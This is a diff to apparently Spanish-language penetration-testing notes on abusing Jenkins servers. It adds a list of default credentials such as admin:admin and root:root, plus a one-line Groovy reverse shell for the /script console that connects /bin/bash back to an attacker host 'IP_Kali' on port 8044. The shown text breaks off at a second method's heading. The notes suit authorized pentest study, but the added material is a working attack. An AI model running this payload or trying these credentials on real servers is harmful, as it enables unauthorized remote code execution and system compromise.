@@ -1,6 +1,6 @@
-# Feature Abuse 
+# Jenkins 
 
-Tags: #AD #Windows #Jenkins #MovimientoLateral  
+Tags: #AD #Linux #Windows #Jenkins #Groovy  
 
 ## Abusar de la app 'Jenkins' 
 
@@ -8,22 +8,40 @@ Tags: #AD #Windows #Jenkins #MovimientoLateral
 Si hay una versión antigua es probable que sea una aplicación vulnerable. El servidor Jenkins es ejecutado en el puerto '8080' 
 
 Aparte de numerosos plugins, hay dos maneras de ejecutar comandos en un 'Jenkins Master'
-Existen usuarios conocidos como: 'builduser, manager, jenkinsadmin'
 ```
 
-## Forma 1 - Jenkins Master
+```bash 
+# Usuarios 
+admin:admin
+jenkins:jsnkins 
+root:root
+builduser
+manager
+jenkinsadmin
+```
+
+```bash 
+# Rutas dentro del server Linux
+/var/lib/jenkins  
+
+
+```
+
+## Forma 1 - Jenkins Master (Groovy)
+
+**Groovy** es un **lenguaje de programación** que corre sobre la **JVM (Java Virtual Machine)**. Está muy relacionado con Java, pero tiene una sintaxis más flexible y concisa.
 
 ```powershell 
-Si se tiene acceso 'Admin' la cual viene instalada en las versiones <2.x 
-❯ http://<jenkins_server>/script 
+Si se tiene acceso 'Admin' la cual viene instalada en las versiones <2.x
 
-En la consola, Groovy scripts pueden ser ejecutados los siguientes comandos:
+	http://<jenkins_server>:8080/script 
 
-	def sout = new StringBuffer(), serr = new StringBuffer()
-	def proc = '[INSERT COMMAND]'.execute()
-	proc.consumeProcessOutput(sout, serr)
-	proc.waitForOrkill(1000)
-	println "out> $sout err> $serr"
+# En la consola, es posible obtener RCE mediante la ejecución de scripts en Groovy:
+
+String host="IP_Kali";
+int port=8044;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
 ## Forma 2 - Jenkins Master
